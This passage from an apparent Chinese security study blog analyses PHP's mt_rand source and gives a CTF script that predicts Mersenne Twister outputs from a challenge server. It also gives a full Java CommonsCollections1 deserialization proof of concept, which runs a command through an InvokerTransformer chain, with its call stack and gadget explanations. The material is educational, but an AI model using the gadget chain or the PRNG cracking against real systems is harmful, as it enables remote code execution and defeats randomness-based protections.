<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> TSRM_UNSHUFFLE_RSRC_ID(rsrc_id)		((rsrc_id)-1)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TSRMG(id, type, element)	(TSRMG_BULK(id, type)-&gt;element)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TSRMG_BULK(id, type)	((type) (*((void ***) tsrm_get_ls_cache()))[TSRM_UNSHUFFLE_RSRC_ID(id)])</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TSRMG_STATIC(id, type, element)	(TSRMG_BULK_STATIC(id, type)-&gt;element)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TSRMG_BULK_STATIC(id, type)	((type) (*((void ***) TSRMLS_CACHE))[TSRM_UNSHUFFLE_RSRC_ID(id)])</span></span><br></pre></td></tr></table></figure>
<p>后在<strong>/ext/standard/mt_rand.c</strong>中定义如下。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> N             MT_N                 <span class="comment">/* length of state vector */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> M             (397)                <span class="comment">/* a period parameter */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> hiBit(u)      ((u) &amp; 0x80000000U)  <span class="comment">/* mask all but highest   bit of u */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> loBit(u)      ((u) &amp; 0x00000001U)  <span class="comment">/* mask all but lowest    bit of u */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> loBits(u)     ((u) &amp; 0x7FFFFFFFU)  <span class="comment">/* mask     the highest   bit of u */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mixBits(u, v) (hiBit(u)|loBits(v)) <span class="comment">/* move hi bit of u to hi bit of v */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> twist(m,u,v)  (m ^ (mixBits(u,v)&gt;&gt;1) ^ ((uint32_t)(-(int32_t)(loBit(v))) &amp; 0x9908b0dfU))</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">php_mt_initialize</span><span class="params">(<span class="type">uint32_t</span> seed, <span class="type">uint32_t</span> *state)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* Initialize generator state with seed</span></span><br><span class="line"><span class="comment">	   See Knuth TAOCP Vol 2, 3rd Ed, p.106 for multiplier.</span></span><br><span class="line"><span class="comment">	   In previous versions, most significant bits (MSBs) of the seed affect</span></span><br><span class="line"><span class="comment">	   only MSBs of the state array.  Modified 9 Jan 2002 by Makoto Matsumoto. */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">register</span> <span class="type">uint32_t</span> *s = state;</span><br><span class="line">	<span class="keyword">register</span> <span class="type">uint32_t</span> *r = state;</span><br><span class="line">	<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	*s++ = seed &amp; <span class="number">0xffffffff</span>U;</span><br><span class="line">	<span class="keyword">for</span>( ; i &lt; N; ++i ) &#123;</span><br><span class="line">		*s++ = ( <span class="number">1812433253U</span> * ( *r ^ (*r &gt;&gt; <span class="number">30</span>) ) + i ) &amp; <span class="number">0xffffffff</span>U;</span><br><span class="line">		r++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; php_mt_reload</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">php_mt_reload</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* Generate N new values in state</span></span><br><span class="line"><span class="comment">	   Made clearer and faster by Matthew Bellew (matthew.bellew@home.com) */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">register</span> <span class="type">uint32_t</span> *state = BG(state);</span><br><span class="line">	<span class="keyword">register</span> <span class="type">uint32_t</span> *p = state;</span><br><span class="line">	<span class="keyword">register</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (BG(mt_rand_mode) == MT_RAND_MT19937) &#123;</span><br><span class="line">		<span class="keyword">for</span> (i = N - M; i--; ++p)</span><br><span class="line">			*p = twist(p[M], p[<span class="number">0</span>], p[<span class="number">1</span>]);</span><br><span class="line">		<span class="keyword">for</span> (i = M; --i; ++p)</span><br><span class="line">			*p = twist(p[M-N], p[<span class="number">0</span>], p[<span class="number">1</span>]);</span><br><span class="line">		*p = twist(p[M-N], p[<span class="number">0</span>], state[<span class="number">0</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">for</span> (i = N - M; i--; ++p)</span><br><span class="line">			*p = twist_php(p[M], p[<span class="number">0</span>], p[<span class="number">1</span>]);</span><br><span class="line">		<span class="keyword">for</span> (i = M; --i; ++p)</span><br><span class="line">			*p = twist_php(p[M-N], p[<span class="number">0</span>], p[<span class="number">1</span>]);</span><br><span class="line">		*p = twist_php(p[M-N], p[<span class="number">0</span>], state[<span class="number">0</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	BG(left) = N;</span><br><span class="line">	BG(next) = state;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; php_mt_srand</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHPAPI <span class="type">void</span> <span class="title function_">php_mt_srand</span><span class="params">(<span class="type">uint32_t</span> seed)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* Seed the generator with a simple uint32 */</span></span><br><span class="line">	php_mt_initialize(seed, BG(state));</span><br><span class="line">	php_mt_reload();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Seed only once */</span></span><br><span class="line">	BG(mt_rand_is_seeded) = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; php_mt_rand</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHPAPI <span class="type">uint32_t</span> <span class="title function_">php_mt_rand</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* Pull a 32-bit integer from the generator state</span></span><br><span class="line"><span class="comment">	   Every other access function simply transforms the numbers extracted here */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">register</span> <span class="type">uint32_t</span> s1;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (UNEXPECTED(!BG(mt_rand_is_seeded))) &#123;</span><br><span class="line">		php_mt_srand(GENERATE_SEED());</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (BG(left) == <span class="number">0</span>) &#123;</span><br><span class="line">		php_mt_reload();</span><br><span class="line">	&#125;</span><br><span class="line">	--BG(left);</span><br><span class="line"></span><br><span class="line">	s1 = *BG(next)++;</span><br><span class="line">	s1 ^= (s1 &gt;&gt; <span class="number">11</span>);</span><br><span class="line">	s1 ^= (s1 &lt;&lt;  <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span>U;</span><br><span class="line">	s1 ^= (s1 &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span>U;</span><br><span class="line">	<span class="keyword">return</span> ( s1 ^ (s1 &gt;&gt; <span class="number">18</span>) );</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; proto void mt_srand([int seed])</span></span><br><span class="line"><span class="comment">   Seeds Mersenne Twister random number generator */</span></span><br><span class="line">PHP_FUNCTION(mt_srand)</span><br><span class="line">&#123;</span><br><span class="line">	zend_long seed = <span class="number">0</span>;</span><br><span class="line">	zend_long mode = MT_RAND_MT19937;</span><br><span class="line"></span><br><span class="line">	ZEND_PARSE_PARAMETERS_START(<span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">		Z_PARAM_OPTIONAL</span><br><span class="line">		<span class="title function_">Z_PARAM_LONG</span><span class="params">(seed)</span></span><br><span class="line">		<span class="title function_">Z_PARAM_LONG</span><span class="params">(mode)</span></span><br><span class="line">	<span class="title function_">ZEND_PARSE_PARAMETERS_END</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ZEND_NUM_ARGS() == <span class="number">0</span>)</span><br><span class="line">		seed = GENERATE_SEED();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (mode) &#123;</span><br><span class="line">		<span class="keyword">case</span> MT_RAND_PHP:</span><br><span class="line">			BG(mt_rand_mode) = MT_RAND_PHP;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			BG(mt_rand_mode) = MT_RAND_MT19937;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	php_mt_srand(seed);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br></pre></td></tr></table></figure>
<p>在<strong>PHP</strong>中使用<strong>mt_srand()</strong>给随机数发生器播种时，一般是使用<strong>MT_RAND_MT19937</strong>模式生成随机数，先调用<strong>php_mt_srand(uint32_t
seed)</strong>函数，利用<strong>seed</strong>先在栈上初始化生成<strong>624</strong>组<strong>state</strong>，后调用<strong>php_mt_reload()</strong>函数重新生成<strong>624</strong>组<strong>state</strong>，接着执行<strong>BG(left)
=
N</strong>表示剩余未用于计算随机数的<strong>state</strong>组数，然后执行<strong>BG(mt_rand_is_seeded)
= 1</strong>表示已经使用过种子播种。</p>
<p>最后每次调用<strong>mt_rand()</strong>函数的时候，都会先检查是否已经使用种子生成过序列值，若无则使用<strong>GENERATE_SEED()</strong>函数生成，否则就根据已有的<strong>state</strong>直接生成新的随机数，同时减少<strong>BG(left)</strong>，当其为<strong>0</strong>时再次调用<strong>php_mt_reload()</strong>函数生成新一组<strong>state</strong>。</p>
<h4 id="例题-2">例题</h4>
<p><strong>Jarvis OJ</strong>的一题<strong>hardrpd</strong>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Unbuffered</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, stream</span>):</span><br><span class="line">       self.stream = stream</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">self, data</span>):</span><br><span class="line">       self.stream.write(data)</span><br><span class="line">       self.stream.flush()</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">__getattr__</span>(<span class="params">self, attr</span>):</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">getattr</span>(self.stream, attr)</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.stdout = Unbuffered(sys.stdout)</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.chdir(<span class="string">&quot;/root/level2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    a=raw_input(<span class="string">&quot;#&quot;</span>)</span><br><span class="line">    target=getrandbits(<span class="number">32</span>)</span><br><span class="line">    <span class="keyword">if</span> a!=<span class="built_in">str</span>(target):</span><br><span class="line">        <span class="built_in">print</span> target</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br></pre></td></tr></table></figure>
<p>那么根据以上的分析，只需收集好<strong>624</strong>组随机数，逆推出用作计算的<strong>state</strong>，再得出下一组新的<strong>state</strong>，计算新的第<strong>625</strong>个随机数即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">target=(<span class="string">&quot;47.97.215.88&quot;</span>,<span class="number">20002</span>)</span><br><span class="line"></span><br><span class="line">io=zio(target)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">getlist=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">    <span class="built_in">print</span> i</span><br><span class="line">    io.read_until(<span class="string">&quot;#&quot;</span>)</span><br><span class="line">    io.writeline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    getlist.append(<span class="built_in">int</span>(io.readline().strip()))</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> libprngcrack</span><br><span class="line">r=libprngcrack.crack_prng(getlist)</span><br><span class="line">io.read_until(<span class="string">&quot;#&quot;</span>)</span><br><span class="line">io.writeline(<span class="built_in">str</span>(r.getrandbits(<span class="number">32</span>)))</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化修炼计划 CommonsCollections</title>
    <url>/Study-CommonsCollections/</url>
    <content><![CDATA[<p><strong>Commons
Collections</strong>的利用链被称为<strong>cc</strong>链，是源自<strong>Apache
Commons
Collections</strong>的第三方库，包括<strong>Weblogic、JBoss、WebSphere、Jenkins</strong>在内的知名<strong>Java</strong>应用都使用了这个库。</p>
<span id="more"></span>
<h1 id="commonscollections1">CommonsCollections1</h1>
<h2 id="transformedmap利用链">TransformedMap利用链</h2>
<p>来自 <strong>P</strong> 牛。</p>
<h3 id="影响版本">影响版本</h3>
<p><strong>JDK&lt;8u71</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="poc">POC</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Documented;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                                    <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class&#125;,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                                    <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class&#125;,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                                    <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">                        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">map</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chainedTransformer);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">handlerConstructor</span> <span class="operator">=</span></span><br><span class="line">                Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>)</span><br><span class="line">                        .getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        handlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">mapHandler</span> <span class="operator">=</span></span><br><span class="line">                (InvocationHandler) handlerConstructor.newInstance(Documented.class, map);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span></span><br><span class="line">                (Map)</span><br><span class="line">                        Proxy.newProxyInstance(</span><br><span class="line">                                ClassLoader.getSystemClassLoader(),</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Map.class&#125;,</span><br><span class="line">                                mapHandler);</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">AnnotationInvocationHandlerConstructor</span> <span class="operator">=</span></span><br><span class="line">                Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>)</span><br><span class="line">                        .getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        AnnotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span></span><br><span class="line">                (InvocationHandler)</span><br><span class="line">                        AnnotationInvocationHandlerConstructor.newInstance(</span><br><span class="line">                                Target.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./CC1&quot;</span>));</span><br><span class="line">            outputStream.writeObject(handler);</span><br><span class="line">            outputStream.close();</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./CC1&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="调用栈">调用栈</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">exec:<span class="number">347</span>, Runtime (java.lang)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">transform:<span class="number">125</span>, InvokerTransformer (org.apache.commons.collections.functors)</span><br><span class="line">transform:<span class="number">122</span>, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">checkSetValue:<span class="number">169</span>, TransformedMap (org.apache.commons.collections.map)</span><br><span class="line">setValue:<span class="number">191</span>, AbstractInputCheckedMapDecorator$MapEntry (org.apache.commons.collections.map)</span><br><span class="line">readObject:<span class="number">451</span>, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1058</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1900</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">371</span>, ObjectInputStream (java.io)</span><br><span class="line">main:<span class="number">38</span>, CC1</span><br></pre></td></tr></table></figure>
<h3 id="前置知识">前置知识</h3>
<h4 id="annotationinvocationhandler">AnnotationInvocationHandler</h4>
<p>起点在 <strong>AnnotationInvocationHandler</strong> 类的
<strong>readObject</strong> 方法。</p>
<p><strong>memberValues</strong> 是反序列化得到的
<strong>map</strong>，即 <strong>TransformedMap</strong>
修饰过的对象，这里赋值给 <strong>var4</strong>
并遍历其所有元素，依次校验并设置值。</p>
<p>调用 <strong>setValue</strong> 方法设置值的时候，触发
<strong>TransformedMap</strong> 类的 <strong>transform</strong>
方法。</p>
<p><strong>AnnotationInvocationHandler</strong>
类的构造方法中，第一个参数需满足是注解类，且其有且仅有一个
<strong>Annotation</strong> 接口。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">    Class[] var3 = var1.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) &#123;</span><br><span class="line">        <span class="built_in">this</span>.type = var1;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = var2;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    var1.defaultReadObject();</span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();</span><br><span class="line">    <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">        Map.<span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Map.Entry)var4.next();</span><br><span class="line">        <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">        <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>java.lang.annotation</strong> 下存在有注解元素名的接口。</p>
<h5 id="target">Target</h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> java.lang.annotation;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.ANNOTATION_TYPE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Target &#123;</span><br><span class="line">    ElementType[] value();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="repeatable">Repeatable</h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> java.lang.annotation;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.ANNOTATION_TYPE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Repeatable &#123;</span><br><span class="line">    Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; value();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="retention">Retention</h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> java.lang.annotation;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.ANNOTATION_TYPE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Retention &#123;</span><br><span class="line">    RetentionPolicy <span class="title function_">value</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="transformer">Transformer</h4>
<p><strong>Transformer</strong> 接口中的 <strong>transform</strong>
方法传入和返回的对象都是 <strong>Object</strong> 类型。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="transformedmap">TransformedMap</h4>
<p><strong>TransformedMap</strong>类使用<strong>checkSetValue</strong>方法处理数据时，调用了<strong>transform</strong>方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而其中的 <strong>decorate</strong> 方法，调用了构造方法并返回新的
<strong>map</strong> 对象。</p>
